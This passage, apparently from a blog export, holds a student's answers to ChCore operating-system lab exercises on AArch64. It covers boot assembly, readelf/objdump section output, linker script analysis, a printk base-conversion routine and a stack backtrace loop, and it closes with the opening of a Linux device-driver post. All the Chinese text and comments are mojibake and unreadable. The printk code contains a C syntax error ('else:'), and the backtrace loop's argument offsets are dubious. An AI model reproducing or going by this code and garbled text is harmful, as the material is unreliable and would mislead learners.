<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">BEGIN_FUNC(arm64_elX_to_el1)</span><br><span class="line">	mrs x9, CurrentEL   // è·å–å½“å‰å¼‚å¸¸çº§åˆ«</span><br><span class="line"></span><br><span class="line">	// Check the current exception level.</span><br><span class="line">	cmp x9, CURRENTEL_EL1   // å¦‚æœå¼‚å¸¸çº§åˆ«ä¸º 1ï¼Œåˆ™ç›´æ¥è¿”å›</span><br><span class="line">	beq .Ltarget</span><br><span class="line">	cmp x9, CURRENTEL_EL2   // å¦‚æœå¼‚å¸¸çº§åˆ«ä¸º 2ï¼Œåˆ™è·³è½¬åˆ° in_el2</span><br><span class="line">	beq .Lin_el2</span><br><span class="line">	// Otherwise, we are in EL3.</span><br><span class="line"></span><br><span class="line">	// Set EL2 to 64bit and enable the HVC instruction.</span><br><span class="line">	mrs x9, scr_el3 </span><br><span class="line">	mov x10, SCR_EL3_NS | SCR_EL3_HCE | SCR_EL3_RW // no-secure | hypervisor call enabled | execution state for lower exception level</span><br><span class="line">	orr x9, x9, x10</span><br><span class="line">	msr scr_el3, x9</span><br><span class="line"></span><br><span class="line">	// Set the return address and exception level.</span><br><span class="line">	adr x9, .Ltarget</span><br><span class="line">	msr elr_el3, x9</span><br><span class="line">	mov x9, SPSR_ELX_DAIF | SPSR_ELX_EL1H</span><br><span class="line">	msr spsr_el3, x9</span><br><span class="line"></span><br><span class="line">.Lin_el2: // å…³æ‰ EL2 çš„çŠ¶æ€</span><br><span class="line">	// Disable EL1 timer traps and the timer offset.</span><br><span class="line">	mrs x9, cnthctl_el2 // å…³æ‰è®¡æ—¶æ§åˆ¶å¯„å­˜å™¨</span><br><span class="line">	orr x9, x9, CNTHCTL_EL2_EL1PCEN | CNTHCTL_EL2_EL1PCTEN</span><br><span class="line">	msr cnthctl_el2, x9</span><br><span class="line">	msr cntvoff_el2, xzr</span><br><span class="line"></span><br><span class="line">	// Disable stage 2 translations.</span><br><span class="line">	msr vttbr_el2, xzr  // å…³æ‰ stage 2 åœ°å€è½¬æ¢</span><br><span class="line"></span><br><span class="line">	// Disable EL2 coprocessor traps. // å…³é—­ é™·å…¥ EL2 çš„åŠŸèƒ½</span><br><span class="line">	mov x9, CPTR_EL2_RES1</span><br><span class="line">	msr cptr_el2, x9</span><br><span class="line"></span><br><span class="line">	// Disable EL1 FPU traps.   // å…³é—­ æµ®ç‚¹åŠŸèƒ½</span><br><span class="line">	mov x9, CPACR_EL1_FPEN</span><br><span class="line">	msr cpacr_el1, x9</span><br><span class="line"></span><br><span class="line">	// Check whether the GIC system registers are supported.</span><br><span class="line">	mrs x9, id_aa64pfr0_el1 // æ˜¯å¦å¯ç”¨ä¸­æ–­æ§åˆ¶å™¨</span><br><span class="line">	and x9, x9, ID_AA64PFR0_EL1_GIC</span><br><span class="line">	cbz x9, .Lno_gic_sr</span><br><span class="line"></span><br><span class="line">	// Enable the GIC system registers in EL2, and allow their use in EL1.</span><br><span class="line">	mrs x9, ICC_SRE_EL2 // å¯åŠ¨ EL2 çš„ GIC ç³»ç»Ÿå¯„å­˜å™¨</span><br><span class="line">	mov x10, ICC_SRE_EL2_ENABLE | ICC_SRE_EL2_SRE</span><br><span class="line">	orr x9, x9, x10</span><br><span class="line">	msr ICC_SRE_EL2, x9</span><br><span class="line"></span><br><span class="line">	// Disable the GIC virtual CPU interface.</span><br><span class="line">	msr ICH_HCR_EL2, xzr // å…³é—­ GIC è™šæ‹Ÿ CPU æ¥å£</span><br><span class="line"></span><br><span class="line">.Lno_gic_sr:    // å¯åŠ¨</span><br><span class="line">	// Set EL1 to 64bit.</span><br><span class="line">	mov x9, HCR_EL2_RW</span><br><span class="line">	msr hcr_el2, x9</span><br><span class="line"></span><br><span class="line">	// Set the return address and exception level.</span><br><span class="line">	adr x9, .Ltarget</span><br><span class="line">	msr elr_el2, x9</span><br><span class="line">	mov x9, SPSR_ELX_DAIF | SPSR_ELX_EL1H</span><br><span class="line">	msr spsr_el2, x9</span><br><span class="line"></span><br><span class="line">	isb</span><br><span class="line">	eret</span><br><span class="line"></span><br><span class="line">.Ltarget:</span><br><span class="line">	ret</span><br><span class="line">END_FUNC(arm64_elX_to_el1)</span><br></pre></td></tr></table></figure>

<h2 id="ç»ƒä¹ -3"><a href="#ç»ƒä¹ -3" class="headerlink" title="ç»ƒä¹  3"></a>ç»ƒä¹  3</h2><blockquote>
<p>ç»“åˆreadelf -S build&#x2F;kernel.imgè¯»å–ç¬¦å·è¡¨ä¸ç»ƒä¹  2 ä¸­çš„GDB è°ƒè¯•ä¿¡æ¯ï¼Œè¯·æ‰¾å‡ºè¯·æ‰¾å‡ºbuild&#x2F;kernel.imageå…¥å£å®šä¹‰åœ¨å“ªä¸ªæ–‡ä»¶ä¸­ã€‚ç»§ç»­å€ŸåŠ©å•æ­¥è°ƒè¯•è¿½è¸ªç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ï¼Œæ€è€ƒä¸€ä¸ªé—®é¢˜ï¼šç›®å‰æœ¬å®éªŒä¸­æ”¯æŒçš„å†…æ ¸æ˜¯å•æ ¸ç‰ˆæœ¬çš„å†…æ ¸ï¼Œç„¶è€Œåœ¨ Raspi3 ä¸Šç”µåï¼Œæ‰€æœ‰å¤„ç†å™¨ä¼šåŒæ—¶å¯åŠ¨ã€‚ç»“åˆboot&#x2F;start.Sä¸­çš„å¯åŠ¨ä»£ç ï¼Œå¹¶è¯´æ˜æŒ‚èµ·å…¶ä»–å¤„ç†å™¨çš„æ§åˆ¶æµã€‚</p>
</blockquote>
<h3 id="å…¥å£å®šä¹‰å‡½æ•°"><a href="#å…¥å£å®šä¹‰å‡½æ•°" class="headerlink" title="å…¥å£å®šä¹‰å‡½æ•°"></a>å…¥å£å®šä¹‰å‡½æ•°</h3><p>readelf ç»“æœ</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">os@ubuntu:~/chcore-lab/build$ readelf -S kernel.img </span><br><span class="line">There are 9 section headers, starting at offset 0x20cd8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] init              PROGBITS         0000000000080000  00010000</span><br><span class="line">       000000000000b5b0  0000000000000008 WAX       0     0     4096</span><br><span class="line">  [ 2] .text             PROGBITS         ffffff000008c000  0001c000</span><br><span class="line">       00000000000011dc  0000000000000000  AX       0     0     8</span><br><span class="line">  [ 3] .rodata           PROGBITS         ffffff0000090000  00020000</span><br><span class="line">       00000000000000f8  0000000000000001 AMS       0     0     8</span><br><span class="line">  [ 4] .bss              NOBITS           ffffff0000090100  000200f8</span><br><span class="line">       0000000000008000  0000000000000000  WA       0     0     16</span><br><span class="line">  [ 5] .comment          PROGBITS         0000000000000000  000200f8</span><br><span class="line">       0000000000000032  0000000000000001  MS       0     0     1</span><br><span class="line">  [ 6] .symtab           SYMTAB           0000000000000000  00020130</span><br><span class="line">       0000000000000858  0000000000000018           7    46     8</span><br><span class="line">  [ 7] .strtab           STRTAB           0000000000000000  00020988</span><br><span class="line">       000000000000030f  0000000000000000           0     0     1</span><br><span class="line">  [ 8] .shstrtab         STRTAB           0000000000000000  00020c97</span><br><span class="line">       000000000000003c  0000000000000000           0     0     1</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ° <code>init</code> æ®µçš„å…¥å£åœ°å€æ˜¯ <code>0x80000</code>ï¼Œå…¶åœ¨ <code>CMakefiles.txt</code> ä¸­å®šä¹‰ï¼Œå¯ä»¥çœ‹åˆ°</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">set(link_script &quot;linker.lds&quot;) // è®¾ç½®é“¾æ¥è„šæœ¬</span><br><span class="line">configure_file(&quot;./scripts/linker-aarch64.lds.in&quot; &quot;linker.lds.S&quot;)</span><br><span class="line"></span><br><span class="line">    - åœ¨é“¾æ¥è„šæœ¬ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå°† init æ®µçš„å†…å®¹è®¾ç½®ä¸ºä¸‹é¢å‡ ä¸ª binary çš„ç»“åˆ</span><br><span class="line">        . = TEXT_OFFSET;</span><br><span class="line">        img_start = .;</span><br><span class="line">        init : &#123;</span><br><span class="line">            CMakeFiles/kernel.img.dir/boot/start.S.o</span><br><span class="line">            CMakeFiles/kernel.img.dir/boot/mmu.c.o</span><br><span class="line">            CMakeFiles/kernel.img.dir/boot/tools.S.o</span><br><span class="line">            CMakeFiles/kernel.img.dir/boot/init_c.c.o</span><br><span class="line">            CMakeFiles/kernel.img.dir/boot/uart.c.o</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">set_property( // é“¾æ¥å‚æ•°è®¾ç½®å¯åŠ¨å‡½æ•°ä¸º _start</span><br><span class="line">    TARGET kernel.img</span><br><span class="line">    APPEND_STRING</span><br><span class="line">    PROPERTY</span><br><span class="line">        LINK_FLAGS</span><br><span class="line">        &quot;-T $&#123;CMAKE_CURRENT_BINARY_DIR&#125;/$&#123;link_script&#125; -e _start&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>å³å…¥å£åœ°å€å®šä¹‰åœ¨ <code>/boot/image.h</code> æ–‡ä»¶ä¸­ï¼Œå°è¯•ä¿®æ”¹ <code>TEXT_OFFSET</code> ä¸º <code>0x70000</code>ï¼Œé‡æ–°ç¼–è¯‘å¹¶å¯åŠ¨è°ƒè¯•åå¯ä»¥çœ‹åˆ°</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">0x0000000000070000 in ?? ()</span><br><span class="line">(gdb) where</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x0000000000070000 <span class="keyword">in</span> _start ()</span></span><br></pre></td></tr></table></figure>

<h3 id="å¯åŠ¨ä»£ç æŒ‚èµ·æ§åˆ¶æµ"><a href="#å¯åŠ¨ä»£ç æŒ‚èµ·æ§åˆ¶æµ" class="headerlink" title="å¯åŠ¨ä»£ç æŒ‚èµ·æ§åˆ¶æµ"></a>å¯åŠ¨ä»£ç æŒ‚èµ·æ§åˆ¶æµ</h3><p>å¯¹ <code>start.S</code> è¿›è¡Œåˆ†æ</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">BEGIN_FUNC(_start)</span><br><span class="line">	mrs	x8, mpidr_el1   // mpidr Multiprocesser è¾…åŠ©è¯†åˆ«å¯„å­˜å™¨ï¼Œæ ¹æ®æ­¤ä¿¡æ¯åˆ¤æ–­å½“å‰ CPU èº«ä»½</span><br><span class="line">	and	x8, x8,	#0xFF</span><br><span class="line">	cbz	x8, primary // å¦‚æœ id ä¸º 0 åˆ™è·³è½¬è‡³ primary å¯åŠ¨ï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥æŒ‚èµ·</span><br><span class="line"></span><br><span class="line">  /* hang all secondary processors before we intorduce multi-processors */</span><br><span class="line">secondary_hang:</span><br><span class="line">	bl secondary_hang</span><br><span class="line">// è‡³æ­¤ä¼šæŒ‚èµ·å…¶ä»–å¤„ç†å™¨çš„æ§åˆ¶æµ</span><br><span class="line">primary:</span><br><span class="line"></span><br><span class="line">	/* Turn to el1 from other exception levels. */</span><br><span class="line">	bl 	arm64_elX_to_el1</span><br><span class="line"></span><br><span class="line">	/* Prepare stack pointer and jump to C. */</span><br><span class="line">	adr 	x0, boot_cpu_stack // 4 ä¸ª CPU æ¯ä¸ª CPU æ ˆå¤§å°ä¸º 0x1000</span><br><span class="line">	add 	x0, x0, #0x1000 // å°†ç¬¬ä¸€ä¸ª CPU æ ˆåº•è®¾ç½®å¥½</span><br><span class="line">	mov 	sp, x0</span><br><span class="line"></span><br><span class="line">	bl 	init_c  // æ‰§è¡Œ C ç¨‹åº</span><br><span class="line"></span><br><span class="line">	/* Should never be here */</span><br><span class="line">	b	.</span><br><span class="line">END_FUNC(_start)</span><br></pre></td></tr></table></figure>
<h2 id="ç»ƒä¹ -4"><a href="#ç»ƒä¹ -4" class="headerlink" title="ç»ƒä¹  4"></a>ç»ƒä¹  4</h2><blockquote>
<p>æŸ¥çœ‹build&#x2F;kernel.imgçš„objdumpä¿¡æ¯ã€‚æ¯”è¾ƒæ¯ä¸€ä¸ªæ®µä¸­çš„ VMA å’Œ LMA æ˜¯å¦ç›¸åŒï¼Œä¸ºä»€ä¹ˆï¼Ÿåœ¨ VMA å’Œ LMA ä¸åŒçš„æƒ…å†µä¸‹ï¼Œå†…æ ¸æ˜¯å¦‚ä½•å°†è¯¥æ®µçš„åœ°å€ä» LMA å˜ä¸º VMAï¼Ÿæç¤ºï¼šä»æ¯ä¸€ä¸ªæ®µçš„åŠ è½½å’Œè¿è¡Œæƒ…å†µè¿›è¡Œåˆ†æ</p>
</blockquote>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -h kernel.img</span> </span><br><span class="line"></span><br><span class="line">kernel.img:     file format elf64-little</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  0 init          0000b5b0  0000000000070000  0000000000070000  00010000  2**12</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, CODE</span><br><span class="line">  1 .text         000011dc  ffffff000007c000  000000000007c000  0001c000  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line">  2 .rodata       000000f8  ffffff0000080000  0000000000080000  00020000  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  3 .bss          00008000  ffffff0000080100  0000000000080100  000200f8  2**4</span><br><span class="line">                  ALLOC</span><br><span class="line">  4 .comment      00000032  0000000000000000  0000000000000000  000200f8  2**0</span><br><span class="line">                  CONTENTS, READONLY</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ä»…æœ‰ init æ®µçš„ LMA å’Œ VMA æ˜¯ä¸€è‡´çš„ï¼Œè¿™ç‚¹éœ€è¦é€šè¿‡åˆ†æé“¾æ¥è„šæœ¬è¿›è¡Œåˆ†æ</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">. = TEXT_OFFSET;  // å½“å‰æŒ‡é’ˆåœ°å€ä¸º 0x80000</span><br><span class="line">img_start = .;</span><br><span class="line">init : &#123;</span><br><span class="line">    $&#123;init_object&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">. = ALIGN(SZ_16K); // å†…å­˜å¯¹é½</span><br><span class="line"></span><br><span class="line">init_end = ABSOLUTE(.);</span><br><span class="line">// æ­¤æ—¶å°† VMA è®¾ç½®ä¸º KERNEL_VADDR + init_end</span><br><span class="line">.text KERNEL_VADDR + init_end : AT(init_end) &#123;</span><br><span class="line">    *(.text*)</span><br><span class="line">&#125;</span><br><span class="line">// åé¢è‡ªåŠ¨é€’å¢</span><br><span class="line">. = ALIGN(SZ_64K);</span><br><span class="line">.data : &#123;</span><br><span class="line">    *(.data*)</span><br><span class="line">&#125;</span><br><span class="line">. = ALIGN(SZ_64K);</span><br><span class="line"></span><br><span class="line">.rodata : &#123;</span><br><span class="line">    *(.rodata*)</span><br><span class="line">&#125;</span><br><span class="line">_edata = . - KERNEL_VADDR;</span><br><span class="line"></span><br><span class="line">_bss_start = . - KERNEL_VADDR;</span><br><span class="line">.bss : &#123;</span><br><span class="line">    *(.bss*)</span><br><span class="line">&#125;</span><br><span class="line">_bss_end = . - KERNEL_VADDR;</span><br><span class="line">. = ALIGN(SZ_64K);</span><br><span class="line">img_end = . - KERNEL_VADDR;</span><br></pre></td></tr></table></figure>
<h2 id="ç»ƒä¹ -5"><a href="#ç»ƒä¹ -5" class="headerlink" title="ç»ƒä¹  5"></a>ç»ƒä¹  5</h2><blockquote>
<p>ä»¥ä¸åŒçš„è¿›åˆ¶æ‰“å°æ•°å­—çš„åŠŸèƒ½ï¼ˆä¾‹å¦‚ 8ã€10ã€16ï¼‰å°šæœªå®ç°ï¼Œè¯·åœ¨kernel&#x2F;common&#x2F;printk.c ä¸­å¡«å…… printk_write_num ä»¥å®Œå–„printkçš„åŠŸèƒ½ã€‚</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">printk_write_num</span><span class="params">(<span class="type">char</span> **out, <span class="type">long</span> <span class="type">long</span> i, <span class="type">int</span> base, <span class="type">int</span> sign,</span></span><br><span class="line"><span class="params">			    <span class="type">int</span> width, <span class="type">int</span> flags, <span class="type">int</span> letbase)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> print_buf[PRINT_BUF_LEN];</span><br><span class="line">	<span class="type">char</span> *s;</span><br><span class="line">	<span class="type">int</span> t, neg = <span class="number">0</span>, pc = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u = i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">		print_buf[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		print_buf[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> prints(out, print_buf, width, flags);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sign &amp;&amp; base == <span class="number">10</span> &amp;&amp; i &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            neg = <span class="number">1</span>;</span><br><span class="line">            u = -i;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// æŒ‰ç…§è¦æ±‚æ·»åŠ è¿›åˆ¶è½¬æ¢åŠŸèƒ½å³å¯</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> fill your code here</span></span><br><span class="line">    s = print_buf + PRINT_BUF_LEN - <span class="number">1</span>;</span><br><span class="line">    *s = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span>(u &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        s--;</span><br><span class="line">        t = u % base;</span><br><span class="line">        <span class="keyword">if</span> (t &lt;= <span class="number">9</span>)</span><br><span class="line">            *s = t + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            *s = t - <span class="number">10</span> + (letbase ? <span class="string">&#x27;a&#x27;</span> : <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">        u /= base;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// store the digitals in the buffer `print_buf`:</span></span><br><span class="line">    <span class="comment">// 1. the last postion of this buffer must be &#x27;\0&#x27;</span></span><br><span class="line">    <span class="comment">// 2. the format is only decided by `base` and `letbase` here</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (neg) &#123;</span><br><span class="line">        <span class="keyword">if</span> (width &amp;&amp; (flags &amp; PAD_ZERO)) &#123;</span><br><span class="line">            simple_outputchar(out, <span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">            ++pc;</span><br><span class="line">            --width;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            *--s = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pc + prints(out, s, width, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å‡½æ•°æ ˆ"><a href="#å‡½æ•°æ ˆ" class="headerlink" title="å‡½æ•°æ ˆ"></a>å‡½æ•°æ ˆ</h2><p>åœ¨æ ¼å¼åŒ–è¾“å‡ºåï¼Œå¢åŠ è°ƒæµ‹å†…æ ¸æ€èƒ½åŠ›ï¼šå †æ ˆå›æº¯</p>
<p>æ ˆæŒ‡é’ˆï¼ˆSPï¼‰ï¼šæŒ‡å‘æ­£åœ¨ä½¿ç”¨çš„æ ˆé¡¶<br>å¸§æŒ‡é’ˆï¼ˆFPï¼‰ï¼šæŒ‡å‘å½“å‰å‡½æ•°çš„æ ˆåº•</p>
<p><strong>ç»ƒä¹  6</strong></p>
<blockquote>
<p>å†…æ ¸æ ˆåˆå§‹åŒ–ï¼ˆå³åˆå§‹åŒ– SP å’Œ FPï¼‰çš„ä»£ç ä½äºå“ªä¸ªå‡½æ•°ï¼Ÿå†…æ ¸æ ˆåœ¨å†…<br>å­˜ä¸­ä½äºå“ªé‡Œï¼Ÿå†…æ ¸å¦‚ä½•ä¸ºæ ˆä¿ç•™ç©ºé—´ï¼Ÿ</p>
</blockquote>
<p>åˆå§‹åŒ–ä»£ç </p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">adr 	x0, boot_cpu_stack</span><br><span class="line">add 	x0, x0, #0x1000</span><br><span class="line">mov 	sp, x0</span><br></pre></td></tr></table></figure>

<p>ä¼šåœ¨ bootloader ä¸­ä¸ºæ¯ä¸ª CPU åˆ†é…æ ˆç»“æ„ï¼Œè¿›å…¥å†…æ ¸åä¼šå†æ¬¡åˆ†é…å‡½æ•°æ ˆ</p>
<p><strong>ç»ƒä¹  7</strong></p>
<blockquote>
<p>ä¸ºäº†ç†Ÿæ‚‰ AArch64 ä¸Šçš„å‡½æ•°è°ƒç”¨æƒ¯ä¾‹ï¼Œè¯·åœ¨kernel&#x2F;main.cä¸­é€šè¿‡<br>GDB æ‰¾åˆ°stack_testå‡½æ•°çš„åœ°å€ï¼Œåœ¨è¯¥å¤„è®¾ç½®ä¸€ä¸ªæ–­ç‚¹ï¼Œå¹¶æ£€æŸ¥åœ¨å†…<br>æ ¸å¯åŠ¨åçš„æ¯æ¬¡è°ƒç”¨æƒ…å†µã€‚æ¯ä¸ªstack_testé€’å½’åµŒå¥—çº§åˆ«å°†å¤šå°‘ä¸ª 64<br>ä½å€¼å‹å…¥å †æ ˆï¼Œè¿™äº›å€¼æ˜¯ä»€ä¹ˆå«ä¹‰ï¼Ÿ</p>
</blockquote>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">Thread 1 hit Breakpoint 1, 0xffffff000008c020 in stack_test ()</span><br><span class="line">(gdb) x/20i $pc</span><br><span class="line">=&gt; 0xffffff000008c020 &lt;stack_test&gt;:	stp	x29, x30, [sp, #-32]!   // å°† FP LR x19 å­˜å…¥æ ˆä¸­</span><br><span class="line">   0xffffff000008c024 &lt;stack_test+4&gt;:	mov	x29, sp</span><br><span class="line">   0xffffff000008c028 &lt;stack_test+8&gt;:	str	x19, [sp, #16]</span><br><span class="line">   0xffffff000008c02c &lt;stack_test+12&gt;:	mov	x19, x0</span><br><span class="line">   0xffffff000008c030 &lt;stack_test+16&gt;:	mov	x1, x0</span><br></pre></td></tr></table></figure>

<p><strong>ç»ƒä¹  8</strong></p>
<blockquote>
<p>åœ¨ AArch64 ä¸­ï¼Œè¿”å›åœ°å€ï¼ˆä¿å­˜åœ¨x30å¯„å­˜å™¨ï¼‰ï¼Œå¸§æŒ‡é’ˆï¼ˆä¿å­˜åœ¨x29å¯„<br>å­˜å™¨ï¼‰å’Œå‚æ•°ç”±å¯„å­˜å™¨ä¼ é€’ã€‚ä½†æ˜¯ï¼Œå½“è°ƒç”¨è€…å‡½æ•°ï¼ˆcaller functionï¼‰è°ƒ<br>ç”¨è¢«è°ƒç”¨è€…å‡½æ•°ï¼ˆcallee fcuntionï¼‰æ—¶ï¼Œä¸ºäº†å¤ç”¨è¿™äº›å¯„å­˜å™¨ï¼Œè¿™äº›å¯„<br>å­˜å™¨ä¸­åŸæ¥çš„å€¼æ˜¯å¦‚ä½•è¢«å­˜åœ¨æ ˆä¸­çš„ï¼Ÿè¯·ä½¿ç”¨ç¤ºæ„å›¾è¡¨ç¤ºï¼Œå›æº¯å‡½æ•°æ‰€<br>éœ€çš„ä¿¡æ¯ï¼ˆå¦‚ SPã€FPã€LRã€å‚æ•°ã€éƒ¨åˆ†å¯„å­˜å™¨å€¼ç­‰ï¼‰åœ¨æ ˆä¸­å…·ä½“ä¿å­˜<br>çš„ä½ç½®åœ¨å“ªï¼Ÿ</p>
</blockquote>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">|           |</span><br><span class="line">|Father&#x27;s FP| ------+</span><br><span class="line">| L     R   |       |</span><br><span class="line">| Paramter  |       |</span><br><span class="line">|Other Data |       |</span><br><span class="line">+-----------+       |</span><br><span class="line">|....       |       |</span><br><span class="line">|.....      |       |</span><br><span class="line">|....       |       |</span><br><span class="line">+-----------+       |</span><br><span class="line">|Father&#x27;s FP| &lt;-----+</span><br><span class="line">+-----------+</span><br><span class="line">|   L   R   |</span><br><span class="line">+-----------+</span><br><span class="line">| Parameter |   ^</span><br><span class="line">+-----------+   |</span><br><span class="line">|Other Data |   |   High Address</span><br><span class="line">|           |   |</span><br></pre></td></tr></table></figure>

<p><strong>ç»ƒä¹  9</strong></p>
<blockquote>
<p>ä½¿ ç”¨ ä¸ ç¤º ä¾‹ ç›¸ åŒ çš„ æ ¼ å¼ï¼Œ åœ¨kernel&#x2F;monitor.cä¸­ å®<br>ç°stack_backtraceã€‚ä¸ºäº†å¿½ç•¥ç¼–è¯‘å™¨ä¼˜åŒ–ç­‰çº§çš„å½±å“ï¼Œåªéœ€è¦<br>è€ƒè™‘stack_testçš„æƒ…å†µï¼Œæˆ‘ä»¬å·²ç»å¼ºåˆ¶äº†è¿™ä¸ªå‡½æ•°ç¼–è¯‘ä¼˜åŒ–ç­‰çº§ã€‚<br>æŒ‘æˆ˜ï¼šè¯·æ€è€ƒï¼Œå¦‚æœè€ƒè™‘æ›´å¤šæƒ…å†µï¼ˆä¾‹å¦‚ï¼Œå¤šä¸ªå‚æ•°ï¼‰æ—¶ï¼Œåº”å½“å¦‚ä½•è¿›<br>è¡Œå›æº¯æ“ä½œï¼Ÿ</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">u64* fp = *((u64*)read_fp());</span><br><span class="line"><span class="keyword">while</span> (fp != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;LR %lx FP %lx Args %lx %lx %lx %lx %lx\n&quot;</span>, *(fp+<span class="number">1</span>), fp, *(fp<span class="number">-2</span>), *(fp<span class="number">-1</span>), *(fp), *(fp+<span class="number">1</span>), *(fp+<span class="number">2</span>));</span><br><span class="line">    fp = (u64*)*fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Kernel</category>
        <category>ARM</category>
      </categories>
      <tags>
        <tag>AArch64</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxè®¾å¤‡é©±åŠ¨ç¨‹åºä¹‹åŸºç¡€çŸ¥è¯†</title>
    <url>/2022/05/24/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<span id="more"></span>

<p>æœ¬æ–‡ä¸»è¦å‚è€ƒã€ŠLinuxè®¾å¤‡é©±åŠ¨ç¨‹åºã€‹ä¸€ä¹¦</p>
<h2 id="è®¾å¤‡å’Œæ¨¡å—çš„åˆ†ç±»"><a href="#è®¾å¤‡å’Œæ¨¡å—çš„åˆ†ç±»" class="headerlink" title="è®¾å¤‡å’Œæ¨¡å—çš„åˆ†ç±»"></a>è®¾å¤‡å’Œæ¨¡å—çš„åˆ†ç±»</h2><p>ä»¥ Linux æ–¹å¼çœ‹å¾…è®¾å¤‡ä¸€èˆ¬åˆ†ä¸º 3 ç§åŸºæœ¬è®¾å¤‡ç±»å‹ï¼Œæ¨¡å—å¸¸å¸¸å®ç°å…¶ä¸­ä¸€ç§</p>
<ul>
<li><p>å­—ç¬¦è®¾å¤‡<br>å¯ä»¥å½“ä½œå­—èŠ‚æµå­˜å–çš„è®¾å¤‡ï¼ˆå¦‚åŒä¸€ä¸ªæ–‡ä»¶ï¼‰ï¼Œå­—ç¬¦é©±åŠ¨è´Ÿè´£å®ç°å…¶è¡Œä¸ºï¼Œä¸€èˆ¬è‡³å°‘å®ç° openï¼Œcloseã€readã€write ç³»ç»Ÿè°ƒç”¨ã€‚æ ‡å‡†ä¾‹å­ï¼šæ–‡æœ¬æ§åˆ¶å° <code>/dev/console</code> ä¸²å£ <code>/dev/ttyS0</code>ã€‚å¤§éƒ¨åˆ†å­—ç¬¦è®¾å¤‡ä»…ä»…æ˜¯æ•°æ®é€šé“ï¼Œåªèƒ½é¡ºåºå­˜å–ï¼Œä½†æ˜¯å¯ä»¥åœ¨é‡Œé¢è¿›è¡Œåç§»</p>
</li>
<li><p>å—è®¾å¤‡<br>é€šè¿‡ <code>/dev</code> ç›®å½•çš„æ–‡ä»¶ç³»ç»ŸèŠ‚ç‚¹è¿›è¡Œå­˜å–ï¼Œåœ¨ Linux ç³»ç»Ÿä¸­å…è®¸åƒå­—ç¬¦è®¾å¤‡ä¸€æ ·ä¸€æ¬¡ä¼ è¾“ä»»æ„æ•°ç›®çš„å­—èŠ‚</p>
</li>
